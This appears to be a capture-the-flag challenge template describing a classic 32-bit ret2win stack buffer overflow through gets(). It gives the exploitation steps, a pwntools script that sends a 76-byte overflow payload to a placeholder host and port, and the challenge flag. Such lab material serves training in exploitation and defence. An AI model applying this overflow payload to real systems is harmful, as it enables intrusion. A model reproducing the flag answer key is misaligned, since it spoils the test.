# Pwn Challenge Template: Stack Crusher (Ret2Win)

## Overview
Classic 32-bit stack buffer overflow with `gets()` and no stack canary.

## Exploitation
1. Disassemble `vuln` and find address of `win()` function (`objdump -d vuln | grep win`).
2. Calculate offset to EIP (typically 76 bytes for 64-byte buffer + EBP).
3. Payload: `b"A" * 76 + p32(win_address)`
4. Send via netcat to target host and allocated instance port:
```python
from pwn import *
r = remote("HOST", PORT)
r.recvuntil(b"payload: ")
payload = b"A" * 76 + p32(0x080491b6) # Replace with exact win() address
r.sendline(payload)
r.interactive()
```

## Flag
`XploitXβ{s74ck_sm4sh_pwn_b0f_succ3ss}`
